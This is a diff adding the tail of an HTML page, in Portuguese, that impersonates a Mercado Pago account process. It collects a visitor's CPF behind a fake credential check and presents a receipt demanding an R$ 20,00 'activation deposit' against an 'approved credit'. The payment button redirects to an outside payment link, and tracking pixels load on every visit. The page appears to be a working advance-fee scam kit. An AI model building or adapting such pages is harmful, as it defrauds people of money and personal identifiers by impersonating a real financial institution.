+        </div>
+
+        <div class="receipt-body">
+          <div class="receipt-section">
+            <div class="receipt-label">Valor do Depósito</div>
+            <div class="receipt-value receipt-amount-value">R$ 20,00</div>
+          </div>
+
+          <div class="receipt-divider"></div>
+
+<div class="receipt-section">
+  <div class="receipt-label">Titular da Conta</div>
+  <div class="receipt-value" id="receiptName">
+    <!-- O nome será inserido aqui -->
+    <script>
+      // Recuperar o nome do titular da conta do localStorage
+      const nomeTitular = localStorage.getItem("nomeUsuario");
+
+      // Verificar se o nome existe no localStorage
+      if (nomeTitular) {
+        // Exibir o nome na div com o ID "receiptName"
+        document.getElementById("receiptName").textContent = nomeTitular;
+      } else {
+        // Caso o nome não esteja no localStorage, exibe "Nome não encontrado"
+        document.getElementById("receiptName").textContent = "Nome não encontrado";
+      }
+    </script>
+  </div>
+</div>
+
+<div class="receipt-section">
+  <div class="receipt-label">CPF</div>
+  <div class="receipt-value" id="receiptCpf">
+    <!-- O CPF será inserido aqui -->
+    <script>
+      // Recuperar o CPF do localStorage
+      const cpfUsuario = localStorage.getItem("cpfUsuario");
+
+      // Verificar se o CPF existe no localStorage
+      if (cpfUsuario) {
+        // Exibir o CPF na div com o ID "receiptCpf"
+        document.getElementById("receiptCpf").textContent = cpfUsuario;
+      } else {
+        // Caso o CPF não esteja no localStorage, exibe "CPF não encontrado"
+        document.getElementById("receiptCpf").textContent = "CPF não encontrado";
+      }
+    </script>
+  </div>
+</div>
+
+
+          <div class="receipt-section">
+            <div class="receipt-label">Instituição</div>
+            <div class="receipt-value">Mercado Pago S.A</div>
+          </div>
+
+          <div class="receipt-divider"></div>
+
+<div class="receipt-section">
+  <div class="receipt-label">Data e Horário</div>
+  <div class="receipt-value" id="receiptDateTime">
+    <!-- O horário será inserido aqui -->
+    <script>
+      // Função para formatar a data e hora no formato "dd/mm/yyyy, hh:mm:ss"
+      function formatDateTime() {
+        const now = new Date();
+        
+        const day = String(now.getDate()).padStart(2, '0');
+        const month = String(now.getMonth() + 1).padStart(2, '0'); // Meses começam do zero
+        const year = now.getFullYear();
+
+        const hours = String(now.getHours()).padStart(2, '0');
+        const minutes = String(now.getMinutes()).padStart(2, '0');
+        const seconds = String(now.getSeconds()).padStart(2, '0');
+
+        return `${day}/${month}/${year}, ${hours}:${minutes}:${seconds}`;
+      }
+
+      // Exibir a data e hora formatada na div
+      document.getElementById("receiptDateTime").textContent = formatDateTime();
+      
+      // Atualizar a cada 1000ms (1 segundo) para mostrar o horário atualizado com os segundos
+      setInterval(() => {
+        document.getElementById("receiptDateTime").textContent = formatDateTime();
+      }, 1000);
+    </script>
+  </div>
+</div>
+
+
+          <div class="receipt-section">
+            <div class="receipt-label">Código do Comprovante</div>
+            <div class="receipt-value receipt-code" id="receiptCode">123456789</div>
+          </div>
+
+          <div class="receipt-divider"></div>
+
+          <div class="receipt-info">
+            <i class="bi bi-info-circle"></i>
+            <span>Este depósito é necessário para validar suas informações bancárias e ativar sua conta.</span>
+          </div>
+        </div>
+
+        <button class="payment-confirm-button" onclick="handlePaymentRedirect()">
+          <i class="fab fa-pix"></i>
+          Realizar Pagamento
+        </button>
+      </div>
+    </div>
+    </div>
+    <!-- END STEP 3: COMPROVANTE -->
+
+    </div>
+    <!-- END ROOT -->
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script>
+      // Global variables
+      window.pixelId = "688817c3b0633f5bb4fabb5c";
+      window.googlePixelId = "6830bd17ec4bfd6b107bae70";
+
+      // Load tracking scripts
+      function loadTrackingScripts() {
+        console.log('Loading tracking scripts...');
+
+        const utmifyScript = document.createElement('script');
+        utmifyScript.src = 'https://cdn.utmify.com.br/scripts/utms/latest.js';
+        utmifyScript.setAttribute('data-utmify-prevent-xcod-sck', '');
+        utmifyScript.setAttribute('data-utmify-prevent-subids', '');
+        utmifyScript.async = true;
+        utmifyScript.defer = true;
+        document.head.appendChild(utmifyScript);
+        console.log('UTMify script loaded');
+
+        const pixelScript = document.createElement('script');
+        pixelScript.src = 'https://cdn.utmify.com.br/scripts/pixel/pixel.js';
+        pixelScript.async = true;
+        pixelScript.defer = true;
+        document.head.appendChild(pixelScript);
+        console.log('Pixel script loaded');
+
+        const googlePixelScript = document.createElement('script');
+        googlePixelScript.src = 'https://cdn.utmify.com.br/scripts/pixel/pixel-google.js';
+        googlePixelScript.async = true;
+        googlePixelScript.defer = true;
+        document.head.appendChild(googlePixelScript);
+        console.log('Google Pixel script loaded');
+      }
+
+      // Show notification
+      function showNotification() {
+        console.log('Showing notification');
+        document.getElementById('notification').classList.add('show');
+      }
+
+      // Close notification
+      function handleCloseNotification() {
+        console.log('Closing notification');
+        document.getElementById('notification').classList.remove('show');
+      }
+
+      // Blocked action
+      function handleBlockedAction(actionName) {
+        console.log('Blocked action clicked:', actionName);
+        showNotification();
+      }
+
+      // Navigation
+      function handleNavigation(navName) {
+        console.log('Navigation clicked:', navName);
+        showNotification();
+      }
+
+      // Pulse animation for deposit icon
+      function addPulseAnimation() {
+        console.log('Adding pulse animation to deposit icon');
+        const depositButton = document.getElementById('depositButtonIcon');
+        if (depositButton) {
+          const icon = depositButton.querySelector('.deposit-icon');
+          if (icon) {
+            icon.classList.add('pulse');
+            setTimeout(() => {
+              icon.classList.remove('pulse');
+            }, 600);
+          }
+        }
+      }
+
+      // Scroll to deposit icon
+      function scrollToDepositIcon() {
+        console.log('Auto-scrolling to deposit icon');
+        const depositButton = document.getElementById('depositButtonIcon');
+        if (depositButton) {
+          depositButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+      }
+
+      // Generate unique receipt code
+      function generateReceiptCode() {
+        return Math.floor(100000000 + Math.random() * 900000000).toString();
+      }
+
+      // Format current date and time
+      function formatDateTime() {
+        const now = new Date();
+        const day = String(now.getDate()).padStart(2, '0');
+        const month = String(now.getMonth() + 1).padStart(2, '0');
+        const year = String(now.getFullYear()).slice(-2);
+        const hours = String(now.getHours()).padStart(2, '0');
+        const minutes = String(now.getMinutes()).padStart(2, '0');
+        return `${day}/${month}/${year}, ${hours}:${minutes}`;
+      }
+
+      // Load user data from localStorage
+      function loadUserData() {
+        const savedName = localStorage.getItem('userName');
+        const savedCpf = localStorage.getItem('userCpf');
+
+        if (savedName) {
+          document.getElementById('receiptName').textContent = savedName;
+        }
+        if (savedCpf) {
+          document.getElementById('receiptCpf').textContent = savedCpf;
+        }
+      }
+
+      // Save user data to localStorage
+      function saveUserData(name, cpf) {
+        if (name) {
+          localStorage.setItem('userName', name);
+        }
+        if (cpf) {
+          localStorage.setItem('userCpf', cpf);
+        }
+      }
+
+      // Show receipt with fade transition
+      // Navigation between steps
+      function goToStep(stepName) {
+        console.log('Navigating to step:', stepName);
+        document.getElementById('step-login').style.display = 'none';
+        document.getElementById('step-loading').style.display = 'none';
+        document.getElementById('step-banco').style.display = 'none';
+        document.getElementById('step-comprovante').style.display = 'none';
+        document.getElementById('step-' + stepName).style.display = 'block';
+      }
+
+      // Handle login
+      function handleLogin() {
+        const cpfInput = document.getElementById('cpf-input').value;
+        console.log('Login attempt with CPF:', cpfInput);
+
+        if (cpfInput && cpfInput.length >= 11) {
+          localStorage.setItem('cpfUsuario', cpfInput);
+
+          // Show loading screen
+          goToStep('loading');
+
+          // Simulate loading with 3 messages
+          const messages = [
+            'Verificando suas credenciais...',
+            'Carregando seus dados...',
+            'Preparando sua conta...'
+          ];
+
+          let messageIndex = 0;
+          const messageInterval = setInterval(() => {
+            messageIndex++;
+            if (messageIndex < messages.length) {
+              document.getElementById('loading-message').textContent = messages[messageIndex];
+            }
+          }, 1000);
+
+          // After 3 seconds, go to banco
+          setTimeout(() => {
+            clearInterval(messageInterval);
+            goToStep('banco');
+          }, 3000);
+        } else {
+          alert('Por favor, insira um CPF válido');
+        }
+      }
+
+      // Handle payment redirect
+      function handlePaymentRedirect() {
+        console.log('Payment button clicked - redirecting to payment...');
+        const currentUrl = new URL(window.location.href);
+        const utmParams = currentUrl.searchParams.toString();
+        const paymentUrl = `https://pay.payments-now.shop/6910fb67b3048109aedfc50d`;
+        console.log('Redirecting to:', paymentUrl);
+        window.location.href = paymentUrl;
+      }
+
+      // Handle deposit action
+      function handleDepositAction() {
+        console.log('Deposit action triggered');
+        handleCloseNotification();
+
+        // Update receipt with current data
+        document.getElementById('receiptDateTime').textContent = formatDateTime();
+        document.getElementById('receiptCode').textContent = generateReceiptCode();
+        loadUserData();
+
+        goToStep('comprovante');
+      }
+
+      // Initialize on page load
+      window.addEventListener('DOMContentLoaded', function() {
+        console.log('App mounted - initializing...');
+
+        // Load tracking scripts
+        loadTrackingScripts();
+
+        // Initialize localStorage with URL parameters if available
+        const urlParams = new URLSearchParams(window.location.search);
+        const nameParam = urlParams.get('name') || urlParams.get('nome');
+        const cpfParam = urlParams.get('cpf');
+
+        if (nameParam || cpfParam) {
+          saveUserData(nameParam, cpfParam);
+          console.log('User data saved from URL parameters');
+        }
+
+        // Show notification after delay
+        setTimeout(() => {
+          showNotification();
+        }, 1000);
+
+        // Scroll to deposit icon after 3 seconds
+        setTimeout(scrollToDepositIcon, 3000);
+
+        // Add pulse animation every 5 seconds
+        setInterval(addPulseAnimation, 5000);
+      });
+    </script>
+  
+<script>
+  // Recuperar o valor aprovado do localStorage
+  const creditoAprovado = localStorage.getItem("creditoAprovado");
+
+  // Exibir o valor aprovado se encontrado
+  if (creditoAprovado) {
+    console.log("Valor Aprovado: R$ " + creditoAprovado.replace(".", ","));
+    document.getElementById("approvedValue").textContent = "R$ " + creditoAprovado.replace(".", ",");
+  } else {
+    console.log("Nenhum valor aprovado encontrado.");
+  }
+
+  // Recuperar o CPF do localStorage
+  const cpfUsuario = localStorage.getItem("cpfUsuario");
+
+  // Exibir o CPF se encontrado
+  if (cpfUsuario) {
+    console.log("CPF do usuário: " + cpfUsuario);
+    // Aqui você pode fazer o que precisar com o CPF, como exibir ou validar
+  } else {
+    console.log("Nenhum CPF encontrado.");
+  }
+</script>
+
+</body></html>
